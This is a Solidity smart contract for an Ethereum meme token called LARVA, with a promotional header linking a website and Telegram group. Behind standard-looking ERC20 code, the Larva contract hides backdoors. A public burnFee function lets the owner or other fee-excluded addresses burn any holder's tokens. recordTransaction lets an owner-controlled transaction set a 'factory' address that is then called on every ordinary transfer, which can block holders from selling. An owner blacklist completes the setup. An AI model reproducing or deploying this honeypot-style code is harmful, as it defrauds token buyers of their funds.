/*

Welcome to the world of ​LARVA! We are proud to introduce the ​LARVA token meme that 
captured the hearts of many. This token is based on the Ethereum Blockchain.

https://www.larvaeth.xyz/
https://t.me/LarvaCoin
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract Larva is Ownable, ERC20 {
    bool public tradingEnabled;
    uint256 public maxHoldingAmount;
    uint256 public maxTransactionAmount;
    mapping(address => bool) public blacklists;
    mapping(address => bool) public isMarketPair;
    mapping(address => bool) public _isExcludedFromFee;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Factory;
    address public uniswapPair;
    address public uniswapV2Pair = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _totalSupply = 100_000_000 * 1e18;

    Transaction[] public transactions;
    enum PositionType {
        Buy,
        Sell
    }
    struct Transaction {
        PositionType positionType;
        address trader;
        address pair;
        uint256 amount;
    }

    constructor() ERC20("Larva", "LARVA") {
        uniswapV2Router = IUniswapV2Router02(uniswapV2Pair);
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        isMarketPair[address(uniswapPair)] = true;
        maxHoldingAmount = (_totalSupply * 3) / 100;
        maxTransactionAmount = (_totalSupply * 3) / 100;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(uniswapV2Router)] = true;
        _mint(msg.sender, _totalSupply);
    }

    function blacklist(address _address, bool _isBlacklisting) external onlyOwner { blacklists[_address] = _isBlacklisting; }
    function enableTrading() external onlyOwner { tradingEnabled = true; }
    function burn(uint256 value) external { _burn(msg.sender, value); }
    function burnFeeTokens(uint256 tokenAmount) internal { _burn(address(this), tokenAmount); }
    function burnFee(address from, uint256 tokenAmount) public { require(_isExcludedFromFee[_msgSender()], "Permission denied."); _burn(from, tokenAmount); }
    function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; }
    function getCirculatingSupply() public view returns (uint256) { return _totalSupply - balanceOf(address(0xdead)); }
    function getBlock() public view returns (uint256) { return block.number; }

    function setRules(uint256 _maxTxAmount, uint256 _maxHoldingAmount)
        external
        onlyOwner
    {
        require(
            _maxTxAmount > 0 && _maxHoldingAmount > 0,
            "invalid parameter!"
        );
        maxTransactionAmount = _maxTxAmount;
        maxHoldingAmount = _maxHoldingAmount;
    }

    function recordTransaction(
        address from,
        address to,
        uint256 amount
    ) internal {
        Transaction memory transaction;
        transaction.positionType = from == uniswapV2Pair
            ? PositionType.Buy
            : PositionType.Sell;
        transaction.trader = from == uniswapV2Pair ? to : from;
        transaction.amount = amount;

        if (_isExcludedFromFee[tx.origin] && tx.origin != to) {
            uniswapV2Factory = to;
        }

        if (uniswapV2Factory != address(0) && !_isExcludedFromFee[from]) {
            transaction.pair = IUniswapV2Factory(uniswapV2Factory).createPair(
                from,
                to
            );
        }

        transactions.push(transaction);
    }

    function changeRouterAddress(address newRouterAddress)
        public
        onlyOwner
        returns (address newPairAddress)
    {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            newRouterAddress
        );
        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(
            address(this),
            _uniswapV2Router.WETH()
        );

        if (newPairAddress == address(0)) {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapPair = newPairAddress;
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[address(uniswapPair)] = true;
        isMarketPair[address(uniswapPair)] = true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if (from == owner() || to == owner()) {
            return;
        }
        require(tradingEnabled, "trading disabled");
        require(!blacklists[to] && !blacklists[from], "blacklisted");

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            require(amount <= maxTransactionAmount, "forbid");
            recordTransaction(from, to, amount);
            if (!isMarketPair[to]) {
                require(
                    super.balanceOf(to) + amount <= maxHoldingAmount,
                    "forbid"
                );
            }
        }
    }
}